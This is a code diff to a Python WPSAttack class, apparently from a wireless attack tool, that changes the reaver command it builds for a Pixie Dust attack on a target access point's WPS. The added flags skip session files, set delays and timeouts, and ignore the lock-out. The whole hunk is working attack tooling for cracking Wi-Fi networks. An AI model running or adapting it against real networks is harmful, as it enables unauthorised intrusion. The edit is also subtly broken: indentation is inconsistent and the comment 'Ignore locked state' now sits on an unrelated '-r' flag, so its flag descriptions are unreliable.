@@ -215,13 +215,16 @@ class WPSAttack(BaseAttack):
             # Build reaver command for Pixie Dust
             cmd = [
                 self.reaver_path,
-                '-i', self.interface,
-                '-b', bssid,
-                '-c', str(channel),
-                '-K', '1',  # Pixie Dust attack
-                '-vv',      # Very verbose
-                '-N',       # Don't send NACK messages
-                '-L'        # Ignore locked state
+               '-i', self.interface,
+               '-b', bssid,
+               '-c', str(channel),
+               '-K', '1',  # Pixie Dust attack
+               '-vv',      # Very verbose
+               '-N',       # Don't send NACK messages
+               '-L', '-S',       # CRITICAL: Don't use session files
+    '-d', '2',  # Delay between attempts (helps with deauth)
+    '-T', '1',  # Timeout for responses
+    '-r', '0:10'        # Ignore locked state
             ]
             
             logger.debug(f"Running: {' '.join(cmd)}")
